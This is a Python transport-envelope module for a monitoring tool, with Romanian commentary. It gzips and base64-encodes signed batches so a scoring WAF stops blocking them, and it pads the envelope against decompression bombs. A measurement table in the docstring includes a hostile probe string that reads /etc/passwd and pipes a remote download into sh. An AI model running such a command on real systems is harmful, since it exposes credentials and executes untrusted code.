"""Plicul de transport: cum ies octeții semnați dintr-o margine care îi citește.

## Pana care a cerut modulul ăsta

Marginea găzduirii agregatorului are un WAF **cu punctaj** care inspectează
corpul JSON al cererii. Fiecare tipar considerat suspect adaugă la un scor;
peste prag, cererea primește `403 Forbidden` în text simplu — nu formatul
nostru, și niciun `403` nu există pe calea `/api/sentinel/sync` în codul de la
celălalt capăt.

`session_commands` e singurul flux al cărui conținut e format din **linii de
comandă**, deci singurul care adună punctaj. Iar `ship_once` avansează cursorul
numai pe ecoul filigranului, deci un lot respins nu mută nimic: același lot
pleacă la nesfârșit, tot ce vine după stă în spate, iar autodiagnosticul
raportează `ship:lag`.

**Cât de puțin trebuie ca să se rupă** — măsurat pe gazda de producție, cu cereri
nesemnate (aplicația răspunde `401` la orice ajunge la ea, deci `401` = a trecut
de margine, orice altceva = oprit înainte):

| proba | rezultat |
|---|---|
| 24 de rânduri reale, JSON în clar | **403** |
| aceleași 24, cu `argv`/`exe` înlocuite cu text inofensiv | 401 |
| aceleași 24, `base64` într-un câmp JSON | **401** |
| `python3 /tmp/mkbody.py` × 1 | 401 |
| × 3 | 401 |
| × 6 | **403** |
| corp de 4 MB din aceeași literă | 401 |
| 400 de rânduri sintetice uniforme | 401 |
| un singur șir ostil (`cat /etc/passwd; curl http://…|sh`) | 401 |

Adică: **trei treceri, șase picate.** Nu mărimea, nu numărul de rânduri, nu
`User-Agent`-ul, nu adresa sursă, nu un rând anume — scorul cumulat pe conținut,
atins de patru–șase apariții ale unei linii de comandă banale (`cat`, `wc -c`,
`python3 /tmp/mkbody.py 400`). Muncă de administrare, nu sarcini de atacator.
Se scrie aici fiindcă altfel următorul om va presupune că a fost ceva exotic și
va căuta rândul vinovat, care nu există.

## Ce face plicul, și ce NU atinge

Corpul devine opac pentru orice intermediar care încearcă să-l citească drept
conținut: `gzip`, apoi `base64`, într-un câmp al unui plic JSON. Varianta asta e
cea PROBATĂ în tabelul de mai sus (rândul cu `401`), nu una raționată.

**Semnătura rămâne peste octeții canonici DINĂUNTRU, neschimbată.**
`sentinel/report/signing.py` și `aggregator/lib/verify.ts` sunt gemeni identici
la octet, iar contractul ăla nu se atinge de aici. Plicul e TRANSPORT, nu
conținut semnat: se aplică DUPĂ `sign()` și se scoate ÎNAINTE de verificare.
Scris pe față fiindcă e exact felul în care cineva ar strica lucrurile mai
târziu — semnând plicul „ca să fie mai simplu" ar rupe geamănul din TypeScript
fără să se vadă altfel decât ca un 401 la fiecare lot, adică exact ce arată o
cheie greșită.

**Antetele rămân în afara plicului.** `X-Sentinel-Instance` e citit ca să se
găsească cheia, înainte de orice verificare; ordinea din protocol — antet →
HMAC peste octeții semnați → `payload.instance_id == antet` — nu se schimbă.

## Forma pe sârmă

    {"enc":"gzip+base64","v":1,"pad":"000…","body":"H4sIA…"}

Primii octeți sunt fixați (`ENVELOPE_PREFIX`) și ASTA e discriminatorul la
receptor: un corp care nu începe cu ei e tratat ca JSON în clar. Alegerea e
deliberată — un prefix se citește în timp constant, în timp ce „parsează și
uită-te dacă are câmpul `enc`" ar muta o analiză JSON a întregului corp
ÎNAINTEA verificării semnăturii. Prețul e că ordinea câmpurilor din plic face
parte din contract: emis altfel, receptorul l-ar citi ca JSON în clar și
semnătura ar pica, adică un 401 care arată ca o cheie greșită. De-aia prefixul e
o constantă la ambele capete, legată de un test.

Forma canonică peste care se semnează începe întotdeauna cu `{"batch_seq":`
(cheile se emit sortate pe puncte de cod), deci nu poate fi confundată cu un
plic.

## Umplutura, și de ce nu e o ciudățenie

Receptorul mărginește decomprimarea în două feluri: dimensiunea absolută (nu mai
mult decât acceptă pe calea în clar) ȘI raportul față de octeții primiți. Al
doilea există fiindcă primul nu-l acoperă: un plic de 8 KB care se desface în
8 MB costă atacatorul o mie de ori mai puțin decât munca pe care o provoacă, iar
ruta e publică pentru cine cunoaște un identificator de instanță.

Problema, măsurată înainte de a alege numărul: **un lot LEGITIM poate atinge
orice raport pe care îl poate atinge o bombă.** `argv` e nemărginit la sursă și
călătorește neatins, deci un singur rând cu o linie de comandă foarte lungă și
repetitivă dă un corp aproape omogen:

| corp | raport gzip |
|---|---|
| 2000 de rânduri reale, comenzi amestecate | 17 |
| 2000 de rânduri cu același `argv` scurt | 74 |
| 2000 de rânduri cu același `argv` de 4 KB | 448 |
| 20 de rânduri cu `argv` de 400 KB | 751 |
| 1 rând cu `argv` de 8 MB | 992 |
| 8 MB din același octet (bombă) | 1026 |

Un plafon de raport pus între 992 și 1026 e o lamă de cuțit; unul sub 992
oprește un lot valid **pentru totdeauna** — și, mai rău, i-ar da oricui are
shell pe gazda monitorizată o comandă prin care oprește arhiva externă, adică
fix proprietatea pentru care există arhiva. Deci raportul nu poate fi un filtru
peste ce iese din gzip.

Ce se face în schimb: **expeditorul ÎȘI GARANTEAZĂ raportul, umplând.** Dacă
octeții comprimați sunt de mai mult de `MAX_INFLATE_RATIO` ori mai puțini decât
cei semnați, se adaugă `pad` până când plicul e destul de mare. Receptorul
verifică o inegalitate pe care expeditorul o respectă prin construcție, deci
plafonul nu poate opri un lot valid, iar amplificarea rămâne mărginită la
`MAX_INFLATE_RATIO`. Costul, pe cel mai comprimabil lot măsurat: plicul crește
de la 25 KB la 131 KB — tot de 64 de ori mai mic decât cei 8,4 MB în clar.

Umplutura e un șir dintr-un singur caracter, iar caracterul e o CIFRĂ, nu `A`:
un corp lung dintr-o singură literă a trecut de margine în măsurătoarea de mai
sus, dar o serie lungă de `A` e semnătura clasică a unei probe de depășire de
tampon, adică exact genul de tipar pentru care un WAF cu punctaj are o regulă.
"""

from __future__ import annotations

import base64
import gzip
from dataclasses import dataclass

from sentinel.errors import SentinelError

__all__ = [
    "ENVELOPE_ENCODING", "ENVELOPE_PREFIX", "ENVELOPE_VERSION", "GZIP_LEVEL",
    "MAX_INFLATE_RATIO", "PAD_CHAR", "Envelope", "EnvelopeError", "wrap",
]

#: Ce transformare poartă plicul. Geamăna e `ENVELOPE_ENCODING` din
#: `aggregator/lib/envelope.ts`; dezacordul se vede ca 400 la fiecare lot.
ENVELOPE_ENCODING = "gzip+base64"

#: Versiunea plicului. Receptorul refuză explicit o versiune pe care n-o
#: cunoaște, cu mesaj — nu o citește „cât poate", fiindcă un plic v2 citit ca v1
#: ar produce alți octeți sub aceeași semnătură.
ENVELOPE_VERSION = 1

#: Octeții după care receptorul recunoaște un plic. Vezi capul modulului pentru
#: de ce un prefix și nu o analiză JSON.
ENVELOPE_PREFIX = b'{"enc":"gzip+base64"'

#: De câte ori are voie corpul semnat să fie mai mare decât plicul care îl duce.
#:
#: Nu e un filtru peste ce poate produce gzip — vezi tabelul din capul modulului,
#: unde un lot legitim atinge 992 și o bombă 1026. E o inegalitate pe care
#: EXPEDITORUL o respectă prin construcție, umplând, iar receptorul o verifică.
#: Consecința: plafonul nu poate opri un lot valid, iar cine trimite un plic
#: nesemnat plătește cel puțin a 64-a parte din munca pe care o provoacă.
MAX_INFLATE_RATIO = 64

#: Caracterul de umplutură. Cifră, nu `A` — vezi capul modulului.
PAD_CHAR = "0"

#: Nivelul de comprimare.
#:
#: 6 (implicitul zlib), nu 9: măsurat pe un lot de 2000 de rânduri de
#: `session_commands`, 9 câștigă 14% din octeți și costă de 2,6 ori mai mult
#: timp (7,3 ms față de 2,8 ms). Câștigul de care avem nevoie e ordinul de
#: mărime — 17× față de 1× —, nu ultimele procente.
GZIP_LEVEL = 6


class EnvelopeError(SentinelError):
    """Plicul nu s-a putut construi așa cum îl cere receptorul.

    Nu e retryabilă: aceiași octeți dau același rezultat. Cine o prinde ratează
    lotul, nu-l reia — iar rândurile rămân pe gazdă, fiindcă un cursor care nu a
    avansat E coada.
    """


@dataclass(frozen=True)
class Envelope:
    """Plicul gata de trimis, cu ce a costat.

    `wire` sunt octeții care pleacă. `inner_bytes` sunt octeții SEMNAȚI — cei
    peste care s-a calculat HMAC-ul și cei pe care receptorul trebuie să-i vadă
    înapoi, identici la octet.
    """

    wire: bytes
    inner_bytes: int
    gzip_bytes: int
    padding_bytes: int

    @property
    def ratio(self) -> float:
        """De câte ori e corpul semnat mai mare decât plicul care îl duce.

        Peste octeții TRIMIȘI, nu peste cei comprimați: ăsta e numărul care se
        compară cu `MAX_INFLATE_RATIO` la celălalt capăt, iar unul calculat pe
        gzip singur ar fi mai mare și ar da o impresie greșită despre cât de
        aproape de plafon e lotul.
        """
        return self.inner_bytes / len(self.wire) if self.wire else 0.0


def wrap(body: bytes) -> Envelope:
    """Octeții semnați, împachetați pentru transport.

    `body` sunt EXACT octeții peste care s-a semnat — forma canonică din
    `signing.py`. Nu se re-serializează nimic aici și nu se atinge nimic
    dinăuntru: plicul e o anvelopă, iar orice atingere a conținutului ar invalida
    o semnătură deja calculată.
    """
    if not isinstance(body, (bytes, bytearray)):
        raise EnvelopeError(
            f"plicul poartă octeții semnați, nu {type(body).__name__}")
    body = bytes(body)

    # `mtime=0`: fără el, gzip pune ceasul în antet, deci același corp produce
    # alți octeți la fiecare rulare. N-ar rupe nimic — semnătura e pe conținut,
    # nu pe plic —, dar un plic reproductibil e un plic pe care un test îl poate
    # compara.
    packed = gzip.compress(body, compresslevel=GZIP_LEVEL, mtime=0)
    encoded = base64.b64encode(packed).decode("ascii")

    head = f'{{"enc":"{ENVELOPE_ENCODING}","v":{ENVELOPE_VERSION},"pad":"'
    tail = f'","body":"{encoded}"}}'
    # Cât trebuie să aibă plicul ca inegalitatea receptorului să fie adevărată.
    # `-(-a // b)` e împărțirea în sus fără float: un `ceil` pe float ar putea
    # rotunji în jos pe corpuri de ordinul gigaoctetului, iar diferența dintre
    # „exact plafonul" și „cu un octet peste" e chiar refuzul.
    needed = -(-len(body) // MAX_INFLATE_RATIO)
    padding = max(0, needed - (len(head) + len(tail)))
    wire = (head + PAD_CHAR * padding + tail).encode("ascii")

    # Efectul, nu intenția: se verifică inegalitatea pe octeții CARE PLEACĂ, nu
    # aritmetica de mai sus. O greșeală în calculul umpluturii ar da altfel un
    # plic pe care receptorul îl refuză cu 413 la fiecare rundă, iar de pe gazdă
    # asta arată ca un agregator căzut — `ship_once` nu deosebește un non-2xx de
    # altul. Aici se vede ca un lot ratat, cu numele problemei în jurnal.
    if len(wire) * MAX_INFLATE_RATIO < len(body):
        raise EnvelopeError(
            f"plicul are {len(wire)} octeți pentru un corp semnat de "
            f"{len(body)}, adică peste raportul de {MAX_INFLATE_RATIO} pe care "
            f"agregatorul îl acceptă; umplutura nu a fost calculată corect")

    return Envelope(wire=wire, inner_bytes=len(body), gzip_bytes=len(packed),
                    padding_bytes=padding)
